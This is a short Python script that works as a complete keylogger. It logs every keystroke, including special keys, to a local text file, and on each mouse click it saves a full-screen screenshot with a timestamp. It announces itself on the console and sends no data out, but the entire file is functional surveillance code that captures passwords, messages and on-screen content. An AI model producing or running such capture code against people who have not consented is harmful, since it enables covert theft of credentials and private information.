from pynput import keyboard, mouse
from datetime import datetime
from PIL import ImageGrab
import os

LOG_FILE = "log.txt"
SS_DIR = "screenshots"

# Create screenshots directory if it does not exist
os.makedirs(SS_DIR, exist_ok=True)

def on_press(key):
    try:
        # Regular character key
        key_data = key.char
    except AttributeError:
        # Special key - format it nicely
        key_name = str(key).replace("Key.", "")
        
        # Map common special keys to readable format
        special_keys = {
            "space": " ",
            "enter": "\n",
            "tab": "\t",
            "backspace": "[BACKSPACE]",
            "shift": "[SHIFT]",
            "shift_r": "[SHIFT]",
            "ctrl": "[CTRL]",
            "ctrl_r": "[CTRL]",
            "alt": "[ALT]",
            "alt_r": "[ALT]",
            "caps_lock": "[CAPS_LOCK]",
            "esc": "[ESC]",
            "delete": "[DELETE]",
            "up": "[UP]",
            "down": "[DOWN]",
            "left": "[LEFT]",
            "right": "[RIGHT]",
        }
        
        key_data = special_keys.get(key_name, f"[{key_name.upper()}]")
    
    with open(LOG_FILE, "a", encoding="utf-8") as file:
        file.write(key_data)

def on_click(x, y, button, pressed):
    if pressed:
        try:
            # Take a screenshot on mouse click using PIL
            screenshot_name = f"{SS_DIR}/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            img = ImageGrab.grab()
            img.save(screenshot_name)

            with open(LOG_FILE, "a", encoding="utf-8") as file:
                file.write(f"\n[{datetime.now()}] - Mouse Click at ({x}, {y}) - screenshot saved\n")
        except Exception as e:
            with open(LOG_FILE, "a", encoding="utf-8") as file:
                file.write(f"\n[{datetime.now()}] - Mouse Click at ({x}, {y}) - screenshot failed: {e}\n")

# Start keyboard and mouse listeners
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

print("Keylogger started. Press Ctrl+C to stop.")
print(f"Logs: {LOG_FILE}")
print(f"Screenshots: {SS_DIR}/")

try:
    keyboard_listener.join()
    mouse_listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped.")